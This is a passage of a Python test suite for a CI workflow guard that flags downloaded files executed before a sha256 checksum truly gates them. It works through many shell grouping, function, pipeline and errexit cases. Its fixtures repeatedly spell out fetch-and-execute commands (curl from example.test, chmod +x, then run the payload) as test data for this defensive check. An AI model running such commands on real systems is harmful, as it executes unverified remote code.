                            ("bash", "%s && (\n  cd / && echo b\n) 2>&1 | tee log\n"),
                            ("bash", "%s && echo ok && (\n  echo b\n) | tee log\n"),
                            (None, "set -o pipefail\n%s && (\n  echo b\n) 2>&1 | tee log\n"),
                            (None, "shopt -so pipefail\n%s && (\n  echo b\n) 2>&1 | tee log\n")):
            with self.subTest(shell=shell, body=body):
                self.assertAhead(body, shell)
        # The controls keep that same ordinary `&&` reach.
        for shell in (None, "sh", "bash"):
            for body in ("%s && ( echo b ) 2>&1 | tee log\n", "%s && ( echo b\n) 2>&1 | tee log\n",
                         "%s && {\n  echo b\n} 2>&1 | tee log\n"):
                with self.subTest(shell=shell, body=body):
                    self.assertAhead(body, shell)
        for shell in (None, "sh"):
            with self.subTest(shell=shell):
                self.assertAhead("%s && (\n  echo b\n) 2>&1 | tee log\n", shell)
        # When the subshell contains the check, pipefail carries its failure
        # and bash stops the step, just as it does for the brace twin.
        self.assertEqual([], self.both("(\n  %s && echo b\n) 2>&1 | tee log\n", "bash"))
        self.assertEqual([], self.job("{\n  %s && echo b\n} 2>&1 | tee log\n", "bash"))

    def test_a_case_inside_a_substitution_is_readable_whatever_surrounds_it(self):
        # #2474 keeps the arm and `esac` inside the substitution. Parentheses
        # and arrays around the list can no longer vouch for a close that the
        # reader lost, so every spelling takes the ordinary `&&` reason.
        sub = "if true; then echo $(case x in x) echo y;; esac); fi"
        every = (None, "sh", "bash")
        for shells, body in (((None, "bash"), "arr=(\n  a\n)\n%s && " + sub + "\n"),
                             (every, "( echo a\n)\n%s && " + sub + "\n"),
                             (every, "( echo a; %s && " + sub + "; echo more )\n"),
                             (every, "( echo a\n  %s && " + sub + "\n  echo more\n)\n"),
                             (every, "%s && if true; then if true; then echo $(case x in x) "
                                     "echo y;; esac) || exit 1; fi; fi\n"),
                             (("bash",), "( echo a\n)\n%s && if true; then ( " + sub
                              + "\n) | tee log\nfi\n")):
            for shell in shells:
                with self.subTest(shell=shell, body=body):
                    self.assertAhead(body, shell)
        # The same list without a prefix and the prefixes without a case use
        # the same readable-list reason.
        for shell in every:
            with self.subTest(shell=shell):
                self.assertAhead("%s && " + sub + "\n", shell)
            for body in ("( echo a\n)\n%s && echo ok\n",
                         "%s && if true; then if true; then echo y || exit 1; fi; fi\n",
                         "( echo a\n)\n%s && if true; then ( echo y\n) | tee log\nfi\n"):
                with self.subTest(shell=shell, body=body):
                    self.assertAhead(body, shell)
        for shell in (None, "bash"):
            with self.subTest(shell=shell):
                self.assertAhead("arr=(\n  a\n)\n%s && echo ok\n", shell)
        # A subshell that holds the list returns the failed check, so every
        # shell stops before the use and the corrected group count clears it.
        for shell in every:
            with self.subTest(shell=shell):
                self.assertEqual([], self.both("( %s && " + sub + " )\n", shell))

    def test_a_child_check_ahead_of_and_keeps_its_real_reach(self):
        # Inside `sh -ec '...'` the failed check stops the rest of the child
        # script. The child command itself is ahead of an outer `&&`, so its
        # failure does not gate a use after that outer list.
        for shell in (None, "sh", "bash"):
            for body in ("sh -ec '%s; chmod +x /tmp/payload; /tmp/payload' && ( echo a\n)\n",
                         "{ sh -ec '%s; chmod +x /tmp/payload; /tmp/payload'; } && ( echo a\n)\n"):
                with self.subTest(shell=shell, body=body):
                    self.assertEqual([], self.both(body + "echo done\n", shell, use=""))
            with self.subTest(shell=shell):
                self.assertAhead("sh -ec '%s' && ( echo a\n)\n", shell)


class TestACheckThatEndsAGroupIsJudgedByWhatFollowsIt(unittest.TestCase):
    """#2334 and #2338 review I-2: a check that is the last command of a
    `{ }` or `( )` group, including one with line-only boundaries, is the
    group's status, so what bash applies to it is what follows the group:
    ahead of `&&` or `||` it suspends `-e` for the whole group, a piped group
    loses its status where pipefail is off, and `&` detaches it. The reader
    gives `{ CHECK; } && echo verified` as `{ CHECK` `;` `}` `&&` `echo
    verified`, so the guard judged the check by its own `;` and credited it
    for the whole step, where bash 5.2.21 and dash run the use after it. A
    check followed by the statements that close its groups is now judged by
    the separator after the last of them, and a group piped under pipefail
    passes its status on the way a subshell does (review N-1)."""

    FETCH = TestASetPlusEAtTheStepsTopLevel.FETCH
    CHECK = TestASetPlusEAtTheStepsTopLevel.CHECK
    USE = TestASetPlusEAtTheStepsTopLevel.USE
    job = TestASetPlusEAtTheStepsTopLevel.job
    both = TestACheckAheadOfAndGatesOnlyItsList.both

    def reported(self, body, shell, why):
        found = self.both(body, shell)
        self.assertEqual(1, len(found), found)
        self.assertIn("the checksum that names /tmp/payload " + why, found[0])

    def test_a_group_ahead_of_and_or_or_gates_only_what_it_reaches(self):
        for shell in (None, "sh", "bash"):
            for body in ("{ %s; } && echo verified\n", "{\n  %s\n} && echo verified\n",
                         "{ echo a; %s; } && echo b\n", "{ { %s; }; } && echo verified\n",
                         "( { %s; } ) && echo verified\n"):
                with self.subTest(shell=shell, body=body):
                    self.reported(body, shell, "runs ahead of `&&`")
            for body in ("{ %s; } || true\n", "{\n  %s\n} || echo failed\n"):
                with self.subTest(shell=shell, body=body):
                    self.reported(body, shell, "ends a group that hands its failure to a `||` "
                                               "branch that does not fail the step")
            with self.subTest(shell=shell, body="&"):
                self.reported("{ %s; } &\nwait\n", shell, "ends a group that is detached with `&`")

    def test_a_group_with_an_unread_rescue_qualifies_the_status_reading(self):
        reason = ("ends a group that hands its failure to a `||` branch that this guard reads "
                  "as not failing the step")
        for shell in (None, "sh", "bash"):
            with self.subTest(shell=shell):
                self.reported("{ %s; } || { if true; then exit 1; fi; }\n", shell, reason)

    def test_a_piped_group_gates_only_under_pipefail(self):
        piped = ("ends a group that is piped into another command where this guard reads "
                 "`pipefail` as off")
        for shell, body in ((None, "{ %s; } | tee log\n"), ("sh", "{ %s; } | tee log\n"),
                            ("bash {0}", "{ %s; } | tee log\n"),
                            ("bash", "set +o pipefail\n{ %s; } | tee log\n"),
                            (None, "{\n  %s\n} 2>&1 | tee log\n"), ("sh", "{\n  %s\n} 2>&1 | tee log\n"),
                            (None, "(\n  %s\n) 2>&1 | tee log\n"), ("sh", "(\n  %s\n) 2>&1 | tee log\n")):
            with self.subTest(shell=shell, body=body):
                self.reported(body, shell, piped)
        for shell, body in (("bash", "{ %s; } | tee log\n"), ("bash", "{\n  %s\n} 2>&1 | tee log\n"),
                            ("bash", "(\n  %s\n) 2>&1 | tee log\n"),
                            (None, "set -o pipefail\n{ %s; } | tee log\n"),
                            # N-1: a piped group ending the check's list runs in a
                            # subshell, whose status pipefail hands the pipeline.
                            ("bash", "{ %s && echo ok; } | cat\n")):
            with self.subTest(shell=shell, body=body):
                self.assertEqual([], self.job(body, shell))
        self.reported("{ %s && echo ok; } | cat\n", None, "runs ahead of `&&`")

    def test_the_forms_that_already_read_right_keep_their_verdicts(self):
        # Reported: the subshell twins, where the reader keeps the group on
        # the check's own statement, and the checks with no group at all.
        for shell in (None, "sh"):
            for body, why in (("( echo a; %s ) && echo b\n", "runs ahead of `&&`"),
                              ("( %s ) 2>&1 | tee log\n", "is piped into another command"),
                              ("%s && echo verified\n", "runs ahead of `&&`"),
                              ("%s | tee log\n", "is piped into another command")):
                with self.subTest(shell=shell, body=body):
                    self.reported(body, shell, why)
        # Cleared: a group whose failure still stops the step, and a use
        # inside the list the group heads.
        for shell in (None, "sh", "bash"):
            for body in ("{ %s; } || exit 1\n", "{ %s; }\n", "{\n  %s\n}\n",
                         '{ %s; } || { echo "::error::bad"; exit 1; }\n', "{ { %s; }; }\n",
                         "{ %s && echo ok; } || exit 1\n", "{ %s && echo ok; } && "):
                with self.subTest(shell=shell, body=body):
                    self.assertEqual([], self.job(body, shell))

    def test_a_later_command_replaces_a_nested_groups_checksum_status(self):
        for shell in (None, "sh", "bash"):
            for ending in ("|| exit 1", "|| true", "&& echo recovered"):
                for nested in ("{ { %s; echo ok; }; }",
                               "{ { { %s; echo ok; }; }; }"):
                    body = nested + " " + ending + "\n"
                    with self.subTest(shell=shell, body=body):
                        self.reported(body, shell, "runs before a later command in an "
                                                   "enclosing conditional group")

    def test_nested_groups_keep_a_checksum_that_really_is_final(self):
        for shell in (None, "sh", "bash"):
            for body in ("{ { %s; echo ok; }; }\n",
                         "{ { %s; }; } || exit 1\n",
                         "{ { { %s; }; }; } || exit 1\n",
                         "{ { %s && echo ok; }; } || exit 1\n",
                         "{ { { %s && echo ok; }; }; } || exit 1\n"):
                with self.subTest(shell=shell, body=body):
                    self.assertEqual([], self.both(body, shell))

    def test_a_later_command_replaces_a_conditional_groups_checksum_status(self):
        for shell in (None, "sh", "bash"):
            for ending in ("|| exit 1", "|| true", "&& echo recovered"):
                for carrier in ("{ %s; echo ok; }", "( %s; echo ok )",
                                "f() { %s; echo ok; }\nf"):
                    body = carrier + " " + ending + "\n"
                    with self.subTest(shell=shell, body=body):
                        self.reported(body, shell, "runs before a later command in an "
                                                   "enclosing conditional group")

    def test_a_single_groups_final_checksum_status_remains_a_gate(self):
        for shell in (None, "sh", "bash"):
            for carrier in ("{ %s; }", "( %s )", "f() { %s; }\nf",
                            "{ %s && echo ok; }", "( %s && echo ok )"):
                with self.subTest(shell=shell, carrier=carrier):
                    self.assertEqual([], self.both(carrier + " || exit 1\n", shell))

    def test_an_unconditional_single_group_still_uses_errexit(self):
        for shell in (None, "sh", "bash"):
            for body in ("{ %s; echo ok; }\n", "( %s; echo ok )\n",
                         "f() { %s; echo ok; }\nf\n"):
                with self.subTest(shell=shell, body=body):
                    self.assertEqual([], self.both(body, shell))

    def test_a_plain_function_call_gates_only_uses_after_that_call(self):
        for shell in (None, "sh", "bash"):
            body = "f() { %s; echo ok; }\n" + self.USE + "f\n"
            with self.subTest(shell=shell):
                found = self.both(body, shell, use="")
                self.assertEqual(1, len(found), found)
                self.assertIn("runs before a later command in an enclosing conditional group",
                              found[0])

    def test_with_errexit_off_a_group_stops_the_step_only_as_its_last_command(self):
        self.assertIn("runs after a `set +e`", self.job("set +e\n{ %s; }\n")[0][1])
        # The group, not the check, is the step's last command: its status is
        # the step's, and the job stops before the next step's use.
        self.assertEqual([], wg.job_defects([
            wg.Step("check", self.FETCH + "set +e\n{ " + self.CHECK + "; }\n"),
            wg.Step("run", self.USE)]))


class TestAFunctionCheckRunsOnlyAtAGatingCall(unittest.TestCase):
    """#2421: a definition does not run its body, and a rescued call gates nothing."""

    FETCH = "curl -fsSL https://example.test/payload -o /tmp/payload\n"
    CHECK = 'echo "%s  /tmp/payload" | sha256sum -c -' % HEX
    USE = "chmod +x /tmp/payload\n/tmp/payload\n"

    def defects(self, body, shell, use=USE):
        script = self.FETCH + body.replace("CHECK", self.CHECK) + use
        return wg.job_defects([wg.Step("run", script, shell)])

    def assert_function_refused(self, found):
        self.assertEqual(1, len(found), found)
        self.assertIn("inside a function", found[0][1])

    def test_an_uncalled_or_rescued_function_does_not_credit_its_check(self):
        for shell in (None, "sh", "bash"):
            for body in (
                "f() { CHECK; }\n",
                "f() { CHECK; }\nf || true\n",
            ):
                with self.subTest(shell=shell, body=body):
                    self.assert_function_refused(self.defects(body, shell))

    def test_a_function_definition_cannot_gate_its_own_and_suffix(self):
        body = ("f() { CHECK && echo ok; } && chmod +x /tmp/payload "
                "&& /tmp/payload\n")
        for shell in (None, "sh", "bash"):
            with self.subTest(shell=shell):
                self.assert_function_refused(self.defects(body, shell, use=""))

    def test_a_function_definition_in_an_earlier_step_does_not_run(self):
        for shell in (None, "sh", "bash"):
            with self.subTest(shell=shell):
                found = wg.job_defects([
                    wg.Step("define", self.FETCH + "set +e\nf() {\n" + self.CHECK
                            + "\n}\n", shell),
                    wg.Step("use", self.USE, shell),
                ])
                self.assert_function_refused(found)

    def test_a_stdin_shell_inside_an_uncalled_or_rescued_function_is_not_credit(self):
        handed = "f() { bash -s <<'EOF'\nCHECK\nEOF\n}\n"
        for shell in (None, "sh", "bash"):
            for call in ("", "f || true\n"):
                with self.subTest(shell=shell, call=call):
                    self.assert_function_refused(self.defects(handed + call, shell))

    def test_a_rescued_function_inside_a_child_script_is_not_credit(self):
        body = ("bash -e -s <<'EOF'\n"
                "f() { CHECK; echo inner; }\n"
                "f || true\n"
                "echo done\n"
                "EOF\n")
        for shell in (None, "sh", "bash"):
            with self.subTest(shell=shell):
                found = self.defects(body, shell)
                self.assertEqual(1, len(found), found)

    def test_a_plain_call_keeps_checks_that_stop_the_function(self):
        handed = "f() { bash -s <<'EOF'\nCHECK\nEOF\n}\nf\n"
        for shell in (None, "sh", "bash"):
            for body in ("f() { CHECK; }\nf\n",
                         "f() { CHECK && echo ok; }\nf\n", handed):
                with self.subTest(shell=shell, body=body):
                    self.assertEqual([], self.defects(body, shell))

    def test_a_plain_call_keeps_inner_child_uses_behind_their_check(self):
        body = ("f() { bash -e -s <<'EOF'\nCHECK\n" + self.USE
                + "EOF\n}\nf\n")
        for shell in (None, "sh", "bash"):
            with self.subTest(shell=shell):
                self.assertEqual([], self.defects(body, shell, use=""))


class TestAUseInTheChecksPipelineIsConcurrent(unittest.TestCase):
    """#2422: a checksum cannot gate another stage of its own pipeline."""

    FETCH = "curl -fsSL https://example.test/payload -o payload\n"
    CHECK = 'echo "%s  payload" | sha256sum -c -' % HEX

    def finding(self, body):
        script = self.FETCH + "set -o pipefail\n" + body.replace("CHECK", self.CHECK)
        return wg.fetch_exec_defect(script)

    def test_a_grouped_check_does_not_clear_a_use_in_the_same_pipeline(self):
        for body in ("{ CHECK; } | sh payload\n",
                     "{ CHECK && echo ok; } | sh payload\n",
                     "{\n  CHECK\n} | sh payload\n",
                     "{ { CHECK; }; } | sh payload\n"):
            with self.subTest(body=body):
                found = self.finding(body)
                self.assertIsNotNone(found)
                self.assertIn("same pipeline", found)

    def test_an_and_list_in_that_group_is_concurrent_under_every_shell(self):
        for shape in ("{ CHECK && echo ok; } | sh payload\n",
                      "( CHECK && echo ok ) | sh payload\n",
                      "( { CHECK && echo ok; } ) | sh payload\n"):
            body = self.FETCH + shape.replace("CHECK", self.CHECK)
            for shell in (None, "sh", "bash"):
                with self.subTest(shape=shape, shell=shell):
                    found = wg.job_defects([wg.Step("run", body, shell)])
                    self.assertEqual(1, len(found), found)
                    self.assertIn("same pipeline", found[0][1])

    def test_a_multiline_downstream_stage_stays_in_the_same_pipeline(self):
        for body in ("{ CHECK; } | {\nsh payload\n}\n",
                     "{ CHECK; } | (\nsh payload\n)\n",
                     "{ CHECK; } | while read -r line; do\nsh payload\ndone\n",
                     "{ CHECK; } | if true; then\nsh payload\nfi\n",
                     "{ CHECK; } |\n  sh payload\n",
                     "{ CHECK; } | (\ncat >/dev/null\nsh payload\n)\n",
                     "{\nCHECK\n} | {\nsh payload\n}\n"):
            with self.subTest(body=body):
                found = self.finding(body)
                self.assertIsNotNone(found)
                self.assertIn("same pipeline", found)

    def test_a_function_check_is_concurrent_when_its_call_is_piped(self):
        shape = "f() { CHECK; }\nf | sh payload\n"
        body = self.FETCH + shape.replace("CHECK", self.CHECK)
        for shell in (None, "sh", "bash"):
            with self.subTest(shell=shell):
                found = wg.job_defects([wg.Step("run", body, shell)])
                self.assertEqual(1, len(found), found)
        found = wg.job_defects([wg.Step("run", body, "bash")])
        self.assertIn("same pipeline", found[0][1])

    def test_a_line_only_subshell_opener_keeps_the_concurrent_pipeline(self):
        body = self.FETCH + ("(\nCHECK && echo ok\n) | sh payload\n"
                             .replace("CHECK", self.CHECK))
        for shell in (None, "sh", "bash"):
            with self.subTest(shell=shell):
                self.assertEqual(1, len(wg.job_defects([wg.Step("run", body, shell)])))

    def test_a_grouped_check_still_gates_uses_after_its_pipeline(self):
        for body in ("{ CHECK; } && sh payload\n",
                     "( CHECK; ) && sh payload\n",
                     "{ CHECK; } | cat\nsh payload\n",
                     "( CHECK; ) | cat\nsh payload\n",
                     "{ CHECK; } | {\ncat\n}\nsh payload\n",
                     "{ CHECK; } | if true; then\ncat\nfi\nsh payload\n",
                     "f() { CHECK; }\nf | cat\nsh payload\n",
                     "{ CHECK; { echo script; } | sh payload; }\n",
                     "{ { CHECK; }; { echo script; } | sh payload; }\n"):
            with self.subTest(body=body):
                self.assertIsNone(self.finding(body))


class TestACheckDoesNotGateItsOwnRescue(unittest.TestCase):
    """#2417: a check cannot certify a use reached only when it fails."""

    FETCH = "curl -fsSL https://example.test/payload -o payload\n"
    CHECK = 'echo "%s  payload" | sha256sum -c -' % HEX
    USE = "sh payload\n"

    def findings(self, body, shell=None):
        script = self.FETCH + body.replace("CHECK", self.CHECK)
        return wg.job_defects([wg.Step("run", script, shell)])

    def test_a_use_in_the_checks_exiting_rescue_is_reported(self):
        for shell in (None, "sh", "bash"):
            for body in ("CHECK || { sh payload; exit 1; }\n",
                         "CHECK && echo ok || { sh payload; exit 1; }\n",
                         "CHECK || ( sh payload; exit 1 )\n"):
                with self.subTest(shell=shell, body=body):
                    found = self.findings(body, shell)
                    self.assertEqual(1, len(found), found)
                    self.assertIn("rescue branch", found[0][1])

    def test_an_exiting_rescue_still_gates_a_later_use(self):
        for shell in (None, "sh", "bash"):
            for rescue in ("CHECK || { echo failed; exit 1; }\n",
                           "CHECK && echo ok || { echo failed; exit 1; }\n",
                           "CHECK || ( echo failed; exit 1 )\n"):
                with self.subTest(shell=shell, rescue=rescue):
                    self.assertEqual([], self.findings(rescue + self.USE, shell))

    def test_the_rescue_reason_does_not_replace_the_ordering_diagnosis(self):
        found = self.findings(self.USE + "CHECK || { exit 1; }\n")
        self.assertEqual(1, len(found), found)
        self.assertIn("only AFTER", found[0][1])
        self.assertNotIn("rescue branch", found[0][1])

    def test_the_rescue_reason_does_not_hide_an_unrelated_checksum(self):
        other = 'echo "%s  other" | sha256sum -c - || { exit 1; }\n' % HEX
        found = wg.fetch_exec_defects(self.FETCH + other + self.USE)
        self.assertEqual(1, len(found), found)
        self.assertIn("checksum of a different file", found[0])
        self.assertNotIn("with nothing verifying", found[0])


class TestChecksumRescueStatus(unittest.TestCase):
    FETCH = "curl -fsSL https://example.test/payload -o payload\n"
    USE = "sh payload\n"

    def checked(self, rescue):
        return wg.fetch_exec_defect(
            self.FETCH + 'echo "%s  payload" | sha256sum -c - || %s\n'
            % (HEX, rescue) + self.USE)

    def test_success_and_unknown_exit_statuses_do_not_certify_failure(self):
        for rescue in ("exit 0", "return 0", "exit 256", "return 256",
                       "exit $STATUS", "return $STATUS", "exit nope",
                       "return nope"):
            with self.subTest(rescue=rescue):
                self.assertIsNotNone(self.checked(rescue))

    def test_an_unread_rescue_branch_says_that_it_is_the_guards_reading(self):
        uncertain = self.checked("{ if true; then exit 1; fi; }") or ""
        self.assertIn("this guard reads as not failing the step", uncertain)
        self.assertNotIn("branch that does not fail the step", uncertain)
        certain = self.checked("{ true; }") or ""
        self.assertIn("branch that does not fail the step", certain)
        self.assertNotIn("this guard reads", certain)

    def test_group_uses_its_last_status(self):
        for rescue in ("{ false; echo recovered; }",
                       "{ false; true; }", "{ false; exit 0; }",
                       "{ false; return 256; }", "{ true; exit; }",
                       "{ echo recovered; exit $?; }", "(false; true)",
                       "((false; true))", "(false; (false; true))",
                       "false || true", "(false) || true",
                       "{ false; } || true", "(exit 1) || true",
                       "((exit 1); echo recovered)",
                       "{ if true; then false; else true; fi; }"):
            with self.subTest(rescue=rescue):
                self.assertIsNotNone(self.checked(rescue))

    def test_and_or_tail_can_rescue_failed_handlers(self):
        for rescue in ("false", "(false)", "{ false; }", "(exit 1)"):
            with self.subTest(rescue=rescue):
                self.assertIsNotNone(self.checked(rescue + " && true || true"))
        self.assertIsNone(self.checked("exit 1 && true || true"))
        self.assertIsNone(self.checked("{ exit 1; } && true || true"))

    def test_known_nonzero_rescues_remain_gates(self):
        for rescue in ("exit 1", "return 2", "exit 257", "false", "exit",
                       "return", "exit $?", "return $?",
                       "{ echo mismatch; exit 1; }", "{ echo mismatch; false; }",
                       "{ false; exit; }", "(echo mismatch; false)",
                       "((echo mismatch; false))", "(false; (true; false))",
                       "(exit 1; echo unreachable)", "exit 1 || true",
                       "{ exit 1; } || true"):
            with self.subTest(rescue=rescue):
                self.assertIsNone(self.checked(rescue))

    def test_negated_detached_and_pipeline_rescues_are_not_gates(self):
        for rescue in ("! false", "exit 1 | true || true", "{ false; } &",
                       "exit 1 &", "{ exit 1; } &"):
            with self.subTest(rescue=rescue):
                self.assertIsNotNone(self.checked(rescue))


class TestSubshellAndNestedGroupStatus(unittest.TestCase):
    """#2431/#2438: a group passes its final status to its enclosing shell."""

    FETCH = "curl -fsSL https://example.test/payload -o payload\n"
    CHECK = 'echo "%s  payload" | sha256sum -c -' % HEX
    USE = "sh payload\n"

    def finding(self, body):
        return wg.fetch_exec_defect(self.FETCH + body.replace("CHECK", self.CHECK) + self.USE)

    def job(self, body, shell):
        script = self.FETCH + body.replace("CHECK", self.CHECK) + self.USE
        return wg.job_defects([wg.Step("step", script, shell)])

    def test_a_nonzero_exit_in_a_subshell_rescue_gates_under_outer_errexit(self):
        for body in ("( CHECK || exit 1 )\n", "( CHECK || exit 2 )\n"):
            with self.subTest(body=body):
                self.assertIsNone(self.finding(body))

    def test_a_line_only_subshell_keeps_its_outer_rescue(self):
        target = "(\nCHECK || exit 1\n) || true\n"
        control = "(\nCHECK || exit 1\n)\n"
        for shell in (None, "sh", "bash"):
            with self.subTest(shell=shell, case="outer rescue"):
                found = self.job(target, shell)
                self.assertEqual(1, len(found), found)
                self.assertIn("does not fail the step", found[0][1])
            with self.subTest(shell=shell, case="unrescued control"):
                self.assertEqual([], self.job(control, shell))

    def test_the_subshell_rescue_controls_still_report(self):
        for body in ("( CHECK || exit 0 )\n", "( CHECK ) || true\n",
                     "set +e\n( CHECK || exit 1 )\n",
                     "( CHECK || exit 1 ) || true\n",
                     "{ ( CHECK || exit 1 ); } || true\n",
                     "{ ( CHECK || exit 1 ); } | cat\n",
                     "{ ( CHECK || exit 1 ); } &\n",
                     "{ ( CHECK || exit 1 ); } && echo ok\n",
                     "( ( CHECK || exit 1 ); echo ok ) || true\n",
                     "f() { ( CHECK || exit 1 ); }\nf || true\n",
                     "f() {\n( CHECK || exit 1 )\n}\nf || true\n",
                     "f()\n{\n( CHECK || exit 1 )\n}\nf || true\n",
                     "f () {\n( CHECK || exit 1 )\n}\nf || true\n",
                     "function f {\n( CHECK || exit 1 )\n}\nf || true\n",
                     "function f() {\n( CHECK || exit 1 )\n}\nf || true\n",
                     "f() {\n( CHECK || exit 1 )\n}\nf | cat\n",
                     "f() {\n( CHECK || exit 1 )\n}\nf &\n",
                     "f() {\n( CHECK || exit 1 )\n}\nf && echo ok\n",
                     "f() {\n{ ( CHECK || exit 1 ); }\n}\nf || true\n",
                     "f() {\n( CHECK || exit 1 )\n}\n",
                     "f() {\n( CHECK || exit 1 )\n}\nsh payload\nf\n"):
            with self.subTest(body=body):
                self.assertIsNotNone(self.finding(body))

    def test_an_unrescued_enclosing_group_keeps_the_subshell_status(self):
        for body in ("{ ( CHECK || exit 1 ); }\n",
                     "{ ( CHECK || exit 1 ); } || exit 1\n",
                     "( ( CHECK || exit 1 ) )\n",
                     "f() {\n( CHECK || exit 1 )\n}\nf\n",
                     "f() { ( CHECK || exit 1 ); }\nf\n",
                     "f() {\n( CHECK || exit 1 )\necho ok\n}\nf\n"):
            with self.subTest(body=body):
                self.assertIsNone(self.finding(body))

    def test_a_function_gate_can_be_called_after_unrelated_statements(self):
        bodies = (
            "f() { GATE; }\necho hi\nf\n",
            "f() { GATE; }\necho hi\necho ho\nf\n",
            "f() { GATE; }\nexport PATH=/x:$PATH\nf\n",
            "f() { GATE; }\ng() { f; }\ng\n",
            "f() { GATE; }\n( f )\n",
            "f() { GATE; }\n{ f; }\n",
            "f() { GATE; }\nf || exit 1\n",
            "set +e\nf() { GATE; }\nf || exit 1\n",
            "f() { GATE; echo after; }\nf\n",
            "f() { GATE; echo after; }\necho hi\nf\n",
            "f() { echo pre; GATE; }\nf || exit 1\n",
            "f() { GATE; }\ng() { f; }\ng || exit 1\n",
            "f() { GATE; }\ng() { f || return 1; }\ng\n",
            "f() { GATE || exit 1; }\necho hi\nf\n",
            "f() { GATE || return 1; }\necho hi\nf\n",
            "f() { GATE || false; }\necho hi\nf\n",
            "outer() {\nf() { GATE; }\nf\n}\nouter\n",
        )
        for body in bodies:
            script = self.FETCH + body.replace("GATE", "( CHECK || exit 1 )").replace(
                "CHECK", self.CHECK) + self.USE
            for shell in (None, "bash", "sh"):
                with self.subTest(body=body, shell=shell):
                    self.assertEqual([], wg.job_defects([wg.Step("run", script, shell)]))

    def test_distant_function_gate_controls_still_report(self):
        bodies = (
            "f() { GATE; }\nf || true\n",
            "f() { GATE; }\nf | cat\n",
            "f() { GATE; }\nf &\n",
            "f() { GATE; }\nf && echo ok\n",
            "f() { GATE; }\n! f\n",
            "f() { GATE; }\nif f; then echo ok; fi\n",
            "f() { GATE; }\ng() { f; }\n",
            "f() { GATE; }\nsh payload\nf\n",
            "f() { GATE; }\nf() { true; }\nf\n",
            "f() { GATE; }\nset +e\nf\n",
            "f() { GATE; }\nif false; then\nf\nfi\n",
            "f() { GATE; }\ng() { set +e; f; }\ng\n",
            "set +e\nf() { GATE; }\nf\n",
            "set +e\nf() { GATE; }\necho hi\nf\n",
            "set +e\nf() { GATE; }\n( f )\n",
            "set +e\nf() { GATE; }\ng() { f; }\ng\n",
            "set +eu\nf() { GATE; }\necho hi\nf\n",
            "true() { GATE; }\nunset -f true\ntrue\n",
            "set +e\nf() { GATE; echo after; }\nf || exit 1\n",
            "set +e\nf() { GATE || true; }\nf || exit 1\n",
            "set +e\nf() { GATE; return 0; }\nf || exit 1\n",
            "set +e\nf() { GATE; true; }\nf || exit 1\n",
            "f() { GATE; echo after; }\nf || exit 1\n",
            "f() { GATE || true; }\nf || exit 1\n",
            "f() { GATE; return 0; }\nf || exit 1\n",
            "f() { GATE; true; }\nf || exit 1\n",
            "set +e\nf() { GATE; echo after; }\nf\n",
            "f() { GATE; echo after; }\n{ f; } || exit 1\n",
            "f() { GATE; echo after; }\n( f ) || exit 1\n",
            "f() { GATE; echo after; }\ng() { f; }\ng || exit 1\n",
            "f() { GATE; }\ng() { f; echo after; }\ng || exit 1\n",
            "f() { GATE; echo after; }\nf || { echo e; exit 1; }\n",
            "f() { GATE; echo a; echo b; }\nf || exit 1\n",
            "f() { ( GATE ); echo after; }\nf || exit 1\n",
            "f() { GATE; echo after; }\necho hi\nf || exit 1\n",
            "f() { GATE; echo after; }\ng() { f || return 1; }\ng\n",
            "f() { GATE; echo after; }\ng() { f || exit 1; }\ng\n",
            "f() { GATE; echo after; }\nif ! f; then exit 1; fi\n",
            "f() { GATE; echo after; }\nf && echo ok || exit 1\n",
            "f() { GATE; echo after; }\nwhile f; do break; done\n",
            "f() { GATE || true; }\necho hi\nf\n",
            "f() { GATE || true; }\n( f )\n",
            "f() { GATE || true; }\ng() { f; }\ng\n",
            "f() { GATE || true; }\nf\n",
            "f() { GATE || echo bad; }\necho hi\nf\n",
            "f() { GATE || return 0; }\necho hi\nf\n",
            "f() { GATE || :; }\necho hi\nf\n",
        )
        for body in bodies:
            script = self.FETCH + body.replace("GATE", "( CHECK || exit 1 )").replace(
                "CHECK", self.CHECK) + self.USE
            for shell in (None, "bash", "sh"):
                with self.subTest(body=body, shell=shell):
                    self.assertEqual(1, len(wg.job_defects([wg.Step("run", script, shell)])))

    def test_assignment_handlers_cannot_certify_distant_function_gates(self):
        handlers = ("x=1", "{ x=1; }", "( x=1 )", "x=$(true)",
                    "x=1 y=2", "x=1; true")
        calls = (
            "f() { GATE || HANDLER; }\necho unrelated\nf\n",
            "f() { GATE || HANDLER; }\n( f )\n",
            "f() { GATE || HANDLER; }\ng() { f; }\ng\n",
            "f() { GATE || HANDLER; }\nf || exit 1\n",
        )
        for handler in handlers:
            for call in calls:
                body = call.replace("GATE", "( CHECK || exit 1 )").replace(
                    "HANDLER", handler)
                script = self.FETCH + body.replace("CHECK", self.CHECK) + self.USE
                for shell in (None, "bash", "sh"):
                    with self.subTest(handler=handler, call=call, shell=shell):
                        found = wg.job_defects([wg.Step("run", script, shell)])
                        self.assertEqual(1, len(found), found)

    def test_false_handler_still_certifies_distant_function_gates(self):
        for call in (
            "f() { GATE || false; }\necho unrelated\nf\n",
            "f() { GATE || false; }\n( f )\n",
            "f() { GATE || false; }\ng() { f; }\ng\n",
            "f() { GATE || false; }\nf || exit 1\n",
        ):
            body = call.replace("GATE", "( CHECK || exit 1 )")
            script = self.FETCH + body.replace("CHECK", self.CHECK) + self.USE
            for shell in (None, "bash", "sh"):
                with self.subTest(call=call, shell=shell):
                    self.assertEqual([], wg.job_defects([wg.Step("run", script, shell)]))

    def test_distant_piped_function_calls_keep_the_use_concurrent(self):
        bodies = (
            "f() { CHECK; }\ng() { f | sh payload; }\ng\n",
            "f() { CHECK; }\ng() {\nf | sh payload\n}\ng\n",
            "f() { CHECK; }\nif true; then\nf | sh payload\nfi\n",
            "f() { CHECK; }\necho hi\nf | sh payload\n",
            "f() { CHECK; }\nset +o pipefail\nf | cat\n",
            "f() { CHECK; }\nf() { true; }\nf | sh payload\n",
        )
        for body in bodies:
            script = self.FETCH + body.replace("CHECK", self.CHECK) + self.USE
            for shell in (None, "bash", "sh"):
                with self.subTest(body=body, shell=shell):
                    found = wg.job_defects([wg.Step("run", script, shell)])
                    self.assertEqual(1, len(found), found)
                    self.assertTrue("same pipeline" in found[0][1]
                                    or "piped into another command" in found[0][1], found)

    def test_a_function_gate_in_a_soft_step_does_not_clear_a_later_step(self):
        for call in ("f() { GATE; }\nf\n", "f() { GATE; }\necho hi\nf\n"):
            check = call.replace("GATE", "( CHECK || exit 1 )").replace("CHECK", self.CHECK)
            for shell in (None, "bash", "sh"):
                with self.subTest(call=call, shell=shell):
                    found = wg.job_defects([
                        wg.Step("get", self.FETCH),
                        wg.Step("check", check, shell, None, True),
                        wg.Step("use", self.USE),
